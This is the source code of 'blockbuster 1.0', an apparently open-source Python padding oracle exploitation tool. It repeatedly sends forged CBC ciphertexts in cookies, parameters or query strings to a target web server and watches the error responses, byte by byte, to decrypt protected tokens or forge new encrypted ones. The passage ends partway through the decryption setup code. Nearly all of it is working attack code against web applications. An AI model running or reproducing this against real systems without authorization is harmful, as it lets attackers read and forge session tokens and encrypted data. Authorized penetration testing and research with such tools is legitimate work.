# blockbuster 1.0
# A python padding oracle vulnerability exploitation tool
# By Paul Mueller (@paulmmueller)

import socket
import httpx
import sys
import urllib.parse
import binascii
import argparse
import os.path
from os import path
import configparser
import json
import validators
import pickle
import time
import base64
import os
import asyncio

# httpx does not emit SSL warnings by default when verify=False


def makeCookieString(cookies):
    cookieString = ""
    for k, v in cookies.items():
        cookieString = cookieString + k + "=" + v + ";"
    return cookieString


def encode_multipart(fields):
    boundary = binascii.hexlify(os.urandom(16)).decode("ascii")

    body = (
        "".join(
            "--%s\r\n"
            'Content-Disposition: form-data; name="%s"\r\n'
            "\r\n"
            "%s\r\n" % (boundary, field, value)
            for field, value in fields.items()
        )
        + "--%s--\r\n" % boundary
    )

    content_type = "multipart/form-data; boundary=%s" % boundary

    return body, content_type


def split_by_n(seq, n):
    """A generator to divide a sequence into chunks of n units."""
    while seq:
        yield seq[:n]
        seq = seq[n:]


# append message to log files
def writeToLog(message):
    ts = str(time.time())
    f = open("blockbuster.log", "a")
    f.write(f"{ts}:{message}\n")
    f.close()


# / and + b64 characters are problematic if they are not URL encoded
def b64urlEncode(string):
    string = string.replace("/", "%2F").replace("+", "%2B")
    return string


# convert bytes to base64
def bytes_to_base64(bytes_v):
    encoded_data = base64.b64encode(bytes_v)
    num_initial = len(bytes_v)
    {0: 0, 1: 2, 2: 1}[num_initial % 3]
    return encoded_data


def handleError(message):
    print(message)
    sys.exit(2)


# Save the current job object to a pickle and write it to a file
def saveState(job):
    ts = time.time()
    if job.currentBlock == (job.blockCount):
        currentBlockStr = "FINAL"
    else:
        currentBlockStr = str(job.currentBlock)
    bytes_done = len(job.block_solved_intermediates)
    byte_suffix = (
        f"-BYTE_{bytes_done}" if bytes_done > 0 and currentBlockStr != "FINAL" else ""
    )
    outputFileName = f"blockbuster-state-{job.name}-BLOCK_{currentBlockStr}{byte_suffix}-{str(int(ts))}.pkl"
    pickleOut = open(outputFileName, "wb")
    pickle.dump(job, pickleOut)
    pickleOut.close()


# add padding to the end of the string
def paddify(string, blocksize):
    groups_storage = []
    groups = list(split_by_n(string, blocksize))
    for idx, group in enumerate(groups):
        # if its not the last block, just append
        if (idx + 1) < len(groups):
            groups_storage.append(str(group))
        else:
            temp_group = str(group[:])
            padding_length = blocksize - len(group)
            # if we fall right on a block boundary, we need a full block of padding
            if padding_length == 0:
                padding_length = blocksize
            for i in range(0, padding_length):
                temp_group = temp_group + chr(padding_length)
            groups_storage.append(temp_group)
    paddedstring = "".join(groups_storage)
    return paddedstring


# The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
class Job:
    # set variables for the instance
    def __init__(
        self,
        blocksize,
        mode,
        debug,
        sourceString,
        name,
        ivMode,
        URL,
        httpMethod,
        additionalParameters,
        httpProxyOn,
        httpProxyIp,
        httpProxyPort,
        headers,
        iv,
        oracleMode,
        oracleText,
        vulnerableParameter,
        inputMode,
        cookies,
        encodingMode,
        postFormat,
        followRedirects,
        concurrency=5,
        redirectDelay=0,
        confirmations=0,
        plaintextEncoding="utf-8",
        anchorCiphertext="",
    ):

        print("[*]Initializing job....")
        self.name = name
        print(f"\nJob name: {self.name}")
        print(f"[+]Blocksize: {str(blocksize)}")
        self.blocksize = blocksize
        self.mode = mode
        print(f"\n[+]Mode: {str(mode)}")
        self.debug = debug
        if self.debug:
            print("[+]Debug Mode ON\n")
        else:
            print("[.]Debug Mode OFF\n")

        self.sourceString = sourceString
        if self.debug:
            print("\n[#]Source String:")
            print(self.sourceString)

        self.ivMode = ivMode
        self.iv = iv
        self.URL = URL
        self.httpMethod = httpMethod
        self.additionalParameters = additionalParameters
        self.httpProxyOn = httpProxyOn
        self.httpProxyIp = httpProxyIp
        self.httpProxyPort = httpProxyPort
        self.headers = headers
        self.cookies = cookies
        self.oracleMode = oracleMode
        self.oracleText = oracleText
        self.vulnerableParameter = vulnerableParameter
        self.inputMode = inputMode
        self.encodingMode = encodingMode
        self.postFormat = postFormat
        self.followRedirects = followRedirects
        self.concurrency = concurrency
        self.redirectDelay = redirectDelay
        self.confirmations = confirmations
        self.plaintextEncoding = plaintextEncoding
        self.anchorCiphertext = anchorCiphertext

        # Pre-seeded intermediate values from a previous partial run
        # Dict of {byte_position: i_value}
        self.preseeded_intermediates = {}

        # establish state on current completed block
        self.currentBlock = 0

        # establish initial state on solved blocks
        self.solvedBlocks = {}

        # Byte-level progress within the current block (survives save/restore)
        self.block_solved_intermediates = {}
        self.block_solved_values = {}  # reals (decrypt) or crypto (encrypt)
        self.block_currentbyte = None
        self.block_padding_num = None

    def __getstate__(self):
        state = self.__dict__.copy()
        # httpx clients contain unpicklable thread locks
        state.pop("client", None)
        state.pop("async_client", None)
        state.pop("_semaphore", None)
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)
        # Ensure byte-level progress fields exist for older pickles
        if not hasattr(self, "block_solved_intermediates"):
            self.block_solved_intermediates = {}
        if not hasattr(self, "block_solved_values"):
            self.block_solved_values = {}
        if not hasattr(self, "block_currentbyte"):
            self.block_currentbyte = None
        if not hasattr(self, "block_padding_num"):
            self.block_padding_num = None

    def _clear_byte_progress(self):
        """Clear byte-level progress after a block completes."""
        self.block_solved_intermediates = {}
        self.block_solved_values = {}
        self.block_currentbyte = None
        self.block_padding_num = None

    def _save_byte_progress(
        self, solved_intermediates, solved_values, currentbyte, padding_num
    ):
        """Save byte-level progress to the job for mid-block persistence."""
        self.block_solved_intermediates = solved_intermediates.copy()
        self.block_solved_values = solved_values.copy()
        self.block_currentbyte = currentbyte
        self.block_padding_num = padding_num
        saveState(self)

    def initialize_client(self):
        proxy = None

        if self.httpProxyOn:
            proxy = f"http://{self.httpProxyIp}:{self.httpProxyPort}"

        # Always disable auto-redirect; we follow redirects manually so we can
        # insert a delay (redirectDelay) between the initial response and the
        # follow-up request.  This is needed when the server stores state (e.g.
        # error messages in a session variable) that hasn't been committed by
        # the time the redirect target is loaded.
        timeout = httpx.Timeout(30.0, connect=10.0)
        self.client = httpx.Client(
            proxy=proxy,
            verify=False,
            follow_redirects=False,
            timeout=timeout,
            http2=True,
        )
        # Pool needs headroom beyond concurrency so redirect follow-ups don't
        # deadlock waiting for the connection from the initial request.
        pool = self.concurrency * 2 + 2
        self.async_client = httpx.AsyncClient(
            proxy=proxy,
            verify=False,
            follow_redirects=False,
            timeout=timeout,
            http2=True,
            limits=httpx.Limits(max_connections=pool, max_keepalive_connections=pool),
        )
        self._semaphore = None

    @property
    def semaphore(self):
        if self._semaphore is None:
            self._semaphore = asyncio.Semaphore(self.concurrency)
        return self._semaphore

    def encodeToken(self, raw_bytes):
        """Encode raw ciphertext bytes into the wire format for the request."""
        if self.encodingMode == "base64":
            b64 = bytes_to_base64(raw_bytes).decode()
            # querystring mode: server expects literal +/= chars, no URL encoding
            if self.inputMode == "querystring":
                return b64
            return urllib.parse.quote_plus(b64)
        elif self.encodingMode == "base64Url":
            return (
                bytes_to_base64(raw_bytes)
                .decode()
                .replace("=", "")
                .replace("+", "-")
                .replace("/", "_")
            )
        elif self.encodingMode == "hex":
            return raw_bytes.hex().upper()

    def oracleSanityCheck(self):
        """Send a random ciphertext to verify the oracle text is detectable in the response.
        Only runs in negative mode where we can confirm the error text appears for bad padding.
        In search mode there's nothing to verify — the oracle text only appears on the rare valid hit."""

        if self.oracleMode != "negative":
            print("[*] Oracle sanity check skipped (only applies to negative mode).")
            return

        print("[*] Running oracle sanity check...")

        # Generate a random 2-block ciphertext that will almost certainly have invalid padding
        random_ct = os.urandom(self.blocksize * 2)

        test_token = self.encodeToken(random_ct)

        result = self.makeRequest(test_token)
        oracle_text = self.oracleText.lower()
        found = oracle_text in result.text.lower()

        if not found:
            print(
                f"[!] WARNING: Oracle text '{self.oracleText}' was NOT found in the response to a random ciphertext."
            )
            print(
                "[!] In 'negative' mode, the text should appear when padding is INVALID."
            )
            print(f"[!] Response preview: {result.text[:500]}")
            handleError("[x] Oracle sanity check failed. Aborting.")
        else:
            print("[+] Oracle text found in response. Sanity check passed.")

    def initialize(self):
        self.initialize_client()

        if self.mode == "decrypt":
            self.decryptInit()
        elif self.mode == "encrypt":
            self.encryptInit()
        else:
            handleError("\n[!]Invalid mode value! Exiting.")

        self.oracleSanityCheck()

    def oracleCheck(self, result):
        """Check the response against the oracle text.

        'search' mode: returns True when text IS found in response.
        'negative' mode: returns True when text is NOT found in response.

        In both modes, True = padding is valid (the 1/256 hit).
        For 'search', set oracleText to something that appears on VALID padding.
        For 'negative', set oracleText to something that appears on INVALID padding.
        """
        response_text = result.text.lower()
        oracle_text = self.oracleText.lower()

        if self.oracleMode == "search":
            return oracle_text in response_text

        elif self.oracleMode == "negative":
            return oracle_text not in response_text

    def _followRedirect(self, response, headers):
        """Manually follow a redirect chain (sync), inserting redirectDelay between hops."""
        max_redirects = 10
        for _ in range(max_redirects):
            if response.status_code not in (301, 302, 303, 307, 308):
                return response
            location = response.headers.get("location")
            if not location:
                return response
            # Resolve relative URLs
            redirect_url = urllib.parse.urljoin(str(response.url), location)
            if self.redirectDelay > 0:
                time.sleep(self.redirectDelay)
            # Follow with GET (standard behaviour for 301/302/303)
            response = self.client.get(redirect_url, headers=headers)
        return response

    async def _followRedirectAsync(self, response, headers):
        """Manually follow a redirect chain (async), inserting redirectDelay between hops."""
        max_redirects = 10
        for _ in range(max_redirects):
            if response.status_code not in (301, 302, 303, 307, 308):
                return response
            location = response.headers.get("location")
            if not location:
                return response
            redirect_url = urllib.parse.urljoin(str(response.url), location)
            if self.redirectDelay > 0:
                await asyncio.sleep(self.redirectDelay)
            response = await self.async_client.get(redirect_url, headers=headers)
        return response

    # make the HTTP request to the target to check current padding array against padding oracle
    def makeRequest(self, encryptedstring, progress=None):

        tempcookies = self.cookies.copy()

        # if the vulnerable parameter is a cookie, add it
        if self.inputMode == "cookie":
            tempcookies[self.vulnerableParameter] = encryptedstring

        # if there are additional cookies they get added here
        cookieString = makeCookieString(tempcookies)
        self.headers["Cookie"] = cookieString

        max_retries = 3
        for attempt in range(max_retries):
            try:
                if self.httpMethod == "GET":
                    urlBuilder = self.URL

                    if self.inputMode == "querystring":
                        # ciphertext IS the entire query string (no parameter name)
                        urlBuilder = urlBuilder + "?" + encryptedstring
                        firstDelimiter = "&"
                    elif self.inputMode == "parameter":
                        # add the vulnerable parameter
                        urlBuilder = (
                            urlBuilder
                            + "?"
                            + self.vulnerableParameter
                            + "="
                            + encryptedstring
                        )

                        # if we already set a GET, additionals should start with "&"
                        firstDelimiter = "&"
                    else:
                        firstDelimiter = "?"

                    # add the additional parameters
                    for idx, additionalParameter in enumerate(
                        self.additionalParameters.items()
                    ):
                        if idx == 0:
                            delimiter = firstDelimiter
                        else:
                            delimiter = "&"
                        urlBuilder = (
                            urlBuilder
                            + delimiter
                            + additionalParameter[0]
                            + "="
                            + additionalParameter[1]
                        )

                    r = self.client.get(urlBuilder, headers=self.headers)

                elif self.httpMethod == "POST":
                    # first, get the additional parameters
                    postData = self.additionalParameters.copy()

                    if self.inputMode == "parameter":
                        # add the vulnerable parameter
                        postData[self.vulnerableParameter] = encryptedstring

                    # for querystring mode, ciphertext goes in the URL, not the body
                    postURL = self.URL
                    if self.inputMode == "querystring":
                        postURL = self.URL + "?" + encryptedstring

                    if self.postFormat == "form-urlencoded":
                        self.headers["Content-Type"] = (
                            "application/x-www-form-urlencoded"
                        )
                        r = self.client.post(
                            postURL, data=postData, headers=self.headers
                        )

                    elif self.postFormat == "multipart":
                        postData, multipartContentType = encode_multipart(postData)
                        self.headers["Content-Type"] = multipartContentType
                        r = self.client.post(
                            postURL, data=postData, headers=self.headers
                        )

                    elif self.postFormat == "json":
                        self.headers["Content-Type"] = "application/json"
                        r = self.client.post(
                            postURL, json=postData, headers=self.headers
                        )

                # Manually follow redirects if enabled
                if self.followRedirects:
                    r = self._followRedirect(r, self.headers)

                return r

            except (
                httpx.ConnectError,
                httpx.TimeoutException,
                httpx.RemoteProtocolError,
            ) as e:
                if attempt < max_retries - 1:
                    wait = 2**attempt
                    if progress is not None:
                        progress[1] += 1
                    else:
                        print(
                            f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})..."
                        )
                    time.sleep(wait)
                else:
                    if progress is None:
                        print(f"[!] Network error after {max_retries} attempts: {e}")
                    raise

    def _buildRequest(self, encryptedstring):
        """Build the URL/data for a request without sending it. Returns (method, url, kwargs)."""
        tempcookies = self.cookies.copy()
        if self.inputMode == "cookie":
            tempcookies[self.vulnerableParameter] = encryptedstring
        cookieString = makeCookieString(tempcookies)
        headers = self.headers.copy()
        headers["Cookie"] = cookieString

        if self.httpMethod == "GET":
            urlBuilder = self.URL
            if self.inputMode == "querystring":
                urlBuilder = urlBuilder + "?" + encryptedstring
                firstDelimiter = "&"
            elif self.inputMode == "parameter":
                urlBuilder = (
                    urlBuilder + "?" + self.vulnerableParameter + "=" + encryptedstring
                )
                firstDelimiter = "&"
            else:
                firstDelimiter = "?"
            for idx, additionalParameter in enumerate(
                self.additionalParameters.items()
            ):
                if idx == 0:
                    delimiter = firstDelimiter
                else:
                    delimiter = "&"
                urlBuilder = (
                    urlBuilder
                    + delimiter
                    + additionalParameter[0]
                    + "="
                    + additionalParameter[1]
                )
            return ("GET", urlBuilder, {"headers": headers})

        elif self.httpMethod == "POST":
            postData = self.additionalParameters.copy()
            if self.inputMode == "parameter":
                postData[self.vulnerableParameter] = encryptedstring
            postURL = self.URL
            if self.inputMode == "querystring":
                postURL = self.URL + "?" + encryptedstring
            if self.postFormat == "form-urlencoded":
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                return ("POST", postURL, {"data": postData, "headers": headers})
            elif self.postFormat == "multipart":
                postData, multipartContentType = encode_multipart(postData)
                headers["Content-Type"] = multipartContentType
                return ("POST", postURL, {"data": postData, "headers": headers})
            elif self.postFormat == "json":
                headers["Content-Type"] = "application/json"
                return ("POST", postURL, {"json": postData, "headers": headers})

    async def makeRequestAsync(self, encryptedstring, progress=None):
        """Async version of makeRequest using the async client."""
        method, url, kwargs = self._buildRequest(encryptedstring)
        max_retries = 3
        for attempt in range(max_retries):
            try:
                if method == "GET":
                    r = await self.async_client.get(url, **kwargs)
                else:
                    r = await self.async_client.post(url, **kwargs)

                # Manually follow redirects if enabled
                if self.followRedirects:
                    r = await self._followRedirectAsync(r, kwargs.get("headers", {}))

                return r
            except (
                httpx.ConnectError,
                httpx.TimeoutException,
                httpx.RemoteProtocolError,
            ) as e:
                if attempt < max_retries - 1:
                    wait = 2**attempt
                    if progress is not None:
                        progress[1] += 1
                    else:
                        print(
                            f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})..."
                        )
                    await asyncio.sleep(wait)
                else:
                    if progress is None:
                        print(f"[!] Network error after {max_retries} attempts: {e}")
                    raise

    async def _testByteValue(
        self,
        count,
        padding_array_template,
        currentbyte,
        padding_num,
        solved_intermediates,
        block_data,
        is_encrypt,
        found_event,
        progress,
    ):
        """Test a single byte value. Returns (count, result) if oracle passes, None if not."""
        async with self.semaphore:
            if found_event.is_set():
                return None

            padding_array = padding_array_template[:]
            padding_array[currentbyte] = count
            for k, v in solved_intermediates.items():
                padding_array[k] = v ^ padding_num

            if is_encrypt:
                tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
            else:
                tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)

            tempToken = self.encodeToken(bytes(tempTokenBytes))

            result = await self.makeRequestAsync(tempToken, progress=progress)

            if found_event.is_set():
                return None

            progress[0] += 1
            tested = progress[0]
            retries = progress[1]
            bar_len = 30
            filled = int(bar_len * tested / 256)
            bar = "█" * filled + "░" * (bar_len - filled)
            retry_str = f" retries:{retries}" if retries > 0 else ""
            print(
                f"\r    Byte {currentbyte:2d}: [{bar}] {tested:3d}/256{retry_str}",
                end="",
                flush=True,
            )

            oracle_pass = self.oracleCheck(result)
            if self.debug:
                oracle_text = self.oracleText.lower()
                found_in_resp = oracle_text in result.text.lower()
                print(
                    f"\n      [DBG] count={count} status={result.status_code} len={len(result.text)} oracle_text_found={found_in_resp} oracle_pass={oracle_pass}"
                )
            if oracle_pass:
                # Confirm the result N times to rule out false positives
                if self.confirmations > 0:
                    for c in range(self.confirmations):
                        if found_event.is_set():
                            return None
                        confirm_result = await self.makeRequestAsync(
                            tempToken, progress=progress
                        )
                        confirm_pass = self.oracleCheck(confirm_result)
                        if self.debug:
                            print(
                                f"\n      [DBG] confirm {c + 1}/{self.confirmations} count={count} oracle_pass={confirm_pass}"
                            )
                        if not confirm_pass:
                            if self.debug:
                                print(
                                    f"\n      [DBG] count={count} FAILED confirmation {c + 1}/{self.confirmations} - false positive"
                                )
                            return None
                found_event.set()
                return (count, result)
            return None

    async def solveByteAsync(
        self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt
    ):
        """Try all 256 values for a byte position concurrently. Returns (count, result) for the winning value."""
        padding_array_template = [0] * self.blocksize
        found_event = asyncio.Event()
        progress = [0, 0]  # [tested_count, retry_count] shared across tasks

        tasks = []
        for count in range(256):
            task = asyncio.create_task(
                self._testByteValue(
                    count,
                    padding_array_template,
                    currentbyte,
                    padding_num,
                    solved_intermediates,
                    block_data,
                    is_encrypt,
                    found_event,
                    progress,
                )
            )
            tasks.append(task)

        # Wait for all tasks, but they'll short-circuit via found_event
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Clear the progress line
        print(
            f"\r    Byte {currentbyte:2d}: [{('█' * 30)}] FOUND at count={'':<20}",
            end="",
        )

        for r in results:
            if r is not None and not isinstance(r, Exception):
                count_val = r[0]
                print(
                    f"\r    Byte {currentbyte:2d}: [{'█' * 30}] FOUND at count={count_val} ({progress[0]} tested)"
                )
                return r

        print(
            f"\r    Byte {currentbyte:2d}: FAILED - no valid padding found in 256 attempts          "
        )
        return None

    def solveByteSync(
        self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt
    ):
        """Sequential version of solveByteAsync for concurrency=1. Uses sync makeRequest."""
        padding_array_template = [0] * self.blocksize
        progress = [0, 0]  # [tested_count, retry_count]

        for count in range(256):
            padding_array = padding_array_template[:]
            padding_array[currentbyte] = count
            for k, v in solved_intermediates.items():
                padding_array[k] = v ^ padding_num

            if is_encrypt:
                tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
            else:
                tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)

            tempToken = self.encodeToken(bytes(tempTokenBytes))

            result = self.makeRequest(tempToken, progress=progress)

            # Progress bar
            progress[0] += 1
            tested = progress[0]
            retries = progress[1]
            bar_len = 30
            filled = int(bar_len * tested / 256)
            bar = "█" * filled + "░" * (bar_len - filled)
            retry_str = f" retries:{retries}" if retries > 0 else ""
            print(
                f"\r    Byte {currentbyte:2d}: [{bar}] {tested:3d}/256{retry_str}",
                end="",
                flush=True,
            )

            oracle_pass = self.oracleCheck(result)
            if self.debug:
                oracle_text = self.oracleText.lower()
                found_in_resp = oracle_text in result.text.lower()
                print(
                    f"\n      [DBG] count={count} status={result.status_code} len={len(result.text)} oracle_text_found={found_in_resp} oracle_pass={oracle_pass}"
                )

            if oracle_pass:
                # Confirm N times to rule out false positives
                if self.confirmations > 0:
                    confirmed = True
                    for c in range(self.confirmations):
                        confirm_result = self.makeRequest(tempToken, progress=progress)
                        confirm_pass = self.oracleCheck(confirm_result)
                        if self.debug:
                            print(
                                f"\n      [DBG] confirm {c + 1}/{self.confirmations} count={count} oracle_pass={confirm_pass}"
                            )
                        if not confirm_pass:
                            if self.debug:
                                print(
                                    f"\n      [DBG] count={count} FAILED confirmation {c + 1}/{self.confirmations} - false positive"
                                )
                            confirmed = False
                            break
                    if not confirmed:
                        continue

                print(
                    f"\r    Byte {currentbyte:2d}: [{'█' * 30}] FOUND at count={count} ({tested} tested, retries:{progress[1]})"
                )

                return (count, result)

        print(
            f"\r    Byte {currentbyte:2d}: FAILED - no valid padding found in 256 attempts          "
        )
        return None

    async def solveByte(
        self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt
    ):
        """Dispatch to sync or async solver based on concurrency setting."""
        if self.concurrency <= 1:
            return self.solveByteSync(
                currentbyte, padding_num, solved_intermediates, block_data, is_encrypt
            )
        else:
            return await self.solveByteAsync(
                currentbyte, padding_num, solved_intermediates, block_data, is_encrypt
            )

    def fakeIV(self):
        return [0] * self.blocksize

    def printProgress(self):
        print(f"\n[!] Solved {self.currentBlock} blocks out of {self.blockCount}")
        print("##################################")
        try:
            print("".join(self.solvedBlocks.values()))
        except Exception:
            print(b"".join(self.solvedBlocks.values()))
        print("##################################")

    def verbosePrint(self, padding_array, tempTokenBytes, tempToken, resultText):
        print("[!]LENGTH OF tempTokenBytes: " + str(len(tempTokenBytes)))
        print("[!]Full result text: " + resultText)
        print("[+]Current padding array: ")
        print("*************************************************")
        print(padding_array)
        print("*************************************************\n")

        print("[*]This is what the encrypted string would look like")
        print("*************************************************")
        print(tempToken)
        print("*************************************************\n")

    def encryptBlockFail(self, padding_array, tempTokenBytes):
        self.decryptBlockFail(padding_array, tempTokenBytes)

    def decryptBlockFail(self, padding_array, tempTokenBytes):

        writeToLog(
            "No characters produced valid padding. For the current block aborting"
        )
        print(
            "\n[!]ERROR! No characters produced valid padding! This must mean there was previously an irrecoverable error!"
        )
        print("*************************************************\n")
        raise Exception(
            "Block failed to decrypt/encrypt, likely a random network error."
        )
        # sys.exit(2)

    def _verifyIntermediate(
        self, byte_pos, i_val, padding_num, solved_intermediates, block_data, is_encrypt
    ):
        """Re-verify a pre-seeded intermediate value by reconstructing the request and checking the oracle."""
        count = i_val ^ padding_num
        padding_array = [0] * self.blocksize
        padding_array[byte_pos] = count
        for k, v in solved_intermediates.items():
            padding_array[k] = v ^ padding_num

        if is_encrypt:
            tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
        else:
            tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)

        tempToken = self.encodeToken(bytes(tempTokenBytes))

        result = self.makeRequest(tempToken)
        return self.oracleCheck(result)

    async def encryptBlock(self):
        print(
            f"[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n"
        )

        # Resume from saved byte-level progress if available
        if self.block_currentbyte is not None and self.block_solved_intermediates:
            solved_intermediates = self.block_solved_intermediates.copy()
            solved_crypto = self.block_solved_values.copy()
            currentbyte = self.block_currentbyte
            padding_num = self.block_padding_num
            bytes_done = self.blocksize - 1 - currentbyte
            print(
                f"[+] Resuming block from byte {currentbyte} ({bytes_done}/{self.blocksize} bytes already solved)"
            )
        else:
            solved_intermediates = {}
            solved_crypto = {}
            padding_num = 1
            currentbyte = self.blocksize - 1

        if self.currentBlock == 0:
            if self.ivMode == "knownIV":
                previousBlock = list(self.iv)
            else:
                previousBlock = [0] * self.blocksize
        else:
            previousBlock = list(bytearray(self.solvedBlocks[self.currentBlock - 1]))

        while currentbyte >= 0:
            # Check if we have a pre-seeded value for this byte (only on first block)
            if currentbyte in self.preseeded_intermediates:
                currenti = self.preseeded_intermediates[currentbyte]
                print(
                    f"[*] Verifying pre-seeded I value {currenti} for byte {currentbyte}..."
                )
                if self._verifyIntermediate(
                    currentbyte,
                    currenti,
                    padding_num,
                    solved_intermediates,
                    previousBlock,
                    is_encrypt=True,
                ):
                    print(f"[+] Verified! Skipping byte {currentbyte}")
                    solved_intermediates[currentbyte] = currenti
                    currentcrypto = (
                        (self.blocks[self.currentBlock][currentbyte]) ^ currenti
                    )
                    print(
                        f"[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n"
                    )
                    solved_crypto[currentbyte] = currentcrypto
                    padding_num += 1
                    currentbyte -= 1
                    self._save_byte_progress(
                        solved_intermediates, solved_crypto, currentbyte, padding_num
                    )
                    continue
                else:
                    print(
                        f"[!] Pre-seeded value FAILED verification. Re-solving byte {currentbyte}..."
                    )

            result = await self.solveByte(
                currentbyte,
                padding_num,
                solved_intermediates,
                previousBlock,
                is_encrypt=True,
            )

            if result is None:
                self.encryptBlockFail([0] * self.blocksize, b"")

            count, _ = result
            print("[+]SOLVED FOR BYTE NUMBER: " + str(currentbyte))
            currenti = count ^ padding_num
            print("[+]The current I value is: " + str(currenti))
            solved_intermediates[currentbyte] = currenti

            currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti
            print(
                f"[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n"
            )
            solved_crypto[currentbyte] = currentcrypto

            padding_num = padding_num + 1
            currentbyte = currentbyte - 1

            # Save byte-level progress after each solved byte
            self._save_byte_progress(
                solved_intermediates, solved_crypto, currentbyte, padding_num
            )

        blockresult = bytes(reversed(list(solved_crypto.values())))
        print("\n*************************************************")
        print("[*]BLOCK SOLVED:")
        print(blockresult)
        print("*************************************************\n")
        writeToLog(f"[!]BLOCK SOLVED: {blockresult}")
        return blockresult

    async def decryptBlock(self):
        print(
            f"[!]Starting Analysis for block number: {self.currentBlock} OF {self.blockCount}\n"
        )

        # Resume from saved byte-level progress if available
        if self.block_currentbyte is not None and self.block_solved_intermediates:
            solved_intermediates = self.block_solved_intermediates.copy()
            solved_reals = self.block_solved_values.copy()
            currentbyte = self.block_currentbyte
            padding_num = self.block_padding_num
            bytes_done = self.blocksize - 1 - currentbyte
            print(
                f"[+] Resuming block from byte {currentbyte} ({bytes_done}/{self.blocksize} bytes already solved)"
            )
        else:
            solved_intermediates = {}
            solved_reals = {}
            padding_num = 1
            currentbyte = self.blocksize - 1

        # if we are on the first block use the IV as the 'previousBlock'
        if self.currentBlock == 0:
            if self.ivMode == "firstblock" or self.ivMode == "knownIV":
                previousBlock = self.iv
            else:
                previousBlock = self.fakeIV()
        else:
            previousBlock = self.blocks[self.currentBlock - 1]

        while currentbyte >= 0:
            tempblock = self.blocks[self.currentBlock][:]

            # Check if we have a pre-seeded value for this byte (only on first block)
            if currentbyte in self.preseeded_intermediates:
                currenti = self.preseeded_intermediates[currentbyte]
                print(
                    f"[*] Verifying pre-seeded I value {currenti} for byte {currentbyte}..."
                )
                if self._verifyIntermediate(
                    currentbyte,
                    currenti,
                    padding_num,
                    solved_intermediates,
                    tempblock,
                    is_encrypt=False,
                ):
                    print(f"[+] Verified! Skipping byte {currentbyte}")
                    solved_intermediates[currentbyte] = currenti
                    currentreal = (previousBlock[currentbyte]) ^ currenti
                    print(f"[+]real value of last char is: {str(currentreal)}\n")
                    solved_reals[currentbyte] = currentreal
                    padding_num += 1
                    currentbyte -= 1
                    self._save_byte_progress(
                        solved_intermediates, solved_reals, currentbyte, padding_num
                    )
                    continue
                else:
                    print(
                        f"[!] Pre-seeded value FAILED verification. Re-solving byte {currentbyte}..."
                    )

            result = await self.solveByte(
                currentbyte,
                padding_num,
                solved_intermediates,
                tempblock,
                is_encrypt=False,
            )

            if result is None:
                self.decryptBlockFail([0] * self.blocksize, b"")

            count, _ = result
            print("[+]SOLVED FOR BYTE NUMBER: " + str(currentbyte))
            currenti = count ^ padding_num
            print("[+]The current I value is: " + str(currenti))
            solved_intermediates[currentbyte] = currenti
            currentreal = (previousBlock[currentbyte]) ^ currenti
            print("[+]real value of last char is: " + str(currentreal) + "\n")
            solved_reals[currentbyte] = currentreal

            padding_num = padding_num + 1
            currentbyte = currentbyte - 1

            # Save byte-level progress after each solved byte
            self._save_byte_progress(
                solved_intermediates, solved_reals, currentbyte, padding_num
            )

        blockresult = bytes(reversed(list(solved_reals.values())))

        try:
            blockresult.decode()
        except Exception:
            blockresult.decode("latin1")
            print("[*] Block contains non-UTF-8 bytes, using latin1 decoding")
        writeToLog(f"[!]BLOCK SOLVED: {blockresult}")
        print(f"[!]BLOCK SOLVED: {blockresult}")
        return blockresult

    async def nextBlock(self):

        if self.mode == "decrypt":
            try:
                result = await self.decryptBlock()

            except Exception as e:
                writeToLog(
                    f"[!] decryption of block {self.currentBlock} failed. Error message: {e}"
                )
                print(
                    f"[!] decryption of block {self.currentBlock} failed. Error message: {e}"
                )
                return 1
        if self.mode == "encrypt":
            try:
                result = await self.encryptBlock()
            except Exception as e:
                writeToLog(
                    f"[!] encryption of block {self.currentBlock} failed. Error message: {e}"
                )
                print(
                    f"[!] encryption of block {self.currentBlock} failed. Error message: {e}"
                )
                return 1

        # add the result to solvedBlocks. We may have to remove it again if we fail the oracleCheck sanity check.
        self.solvedBlocks[self.currentBlock] = result

        if self.mode == "encrypt":
            # combine all of the blocks into one decimal list
            joinedCrypto = b"".join(reversed(list(self.solvedBlocks.values())))

            # Append the anchor block that was used as previousBlock for block 0.
            if self.ivMode in ("knownIV", "anchorBlock"):
                joinedCrypto = b"".join([joinedCrypto, bytes(self.iv)])
            else:
                joinedCrypto = b"".join([joinedCrypto, bytes([0] * self.blocksize)])

            encryptTemp = self.encodeToken(joinedCrypto)
            oracleCheckResult = self.makeRequest(encryptTemp)

            # if the oracleCheck failed... (not solved)
            if not self.oracleCheck(oracleCheckResult):
                writeToLog(
                    f"[!] encryption of block {self.currentBlock} failed. Reason: Sanity Check failed."
                )
                print("block failed sanity check!")
                # back out of the block
                del self.solvedBlocks[self.currentBlock]
                return 1

        return 0

    # initialize variables necessary to perform decryption.
    def decryptInit(self):

        # Run the string through a URL decoder
        unquoted_sourcestring = urllib.parse.unquote(self.sourceString)

        # decode the encrypted string

        if (self.encodingMode == "base64") or (self.encodingMode == "base64Url"):
            # some base64 implementations strip padding, if so we need to add it back
            unquoted_sourcestring += "=" * (len(unquoted_sourcestring) % 4)

        if self.encodingMode == "base64Url":
            unquoted_sourcestring = unquoted_sourcestring.replace("-", "+").replace(
                "_", "/"
            )

        if (self.encodingMode == "base64") or (self.encodingMode == "base64Url"):
            decoded_sourcestring = binascii.a2b_base64(unquoted_sourcestring)

        if self.encodingMode == "hex":
            decoded_sourcestring = bytes.fromhex(unquoted_sourcestring)

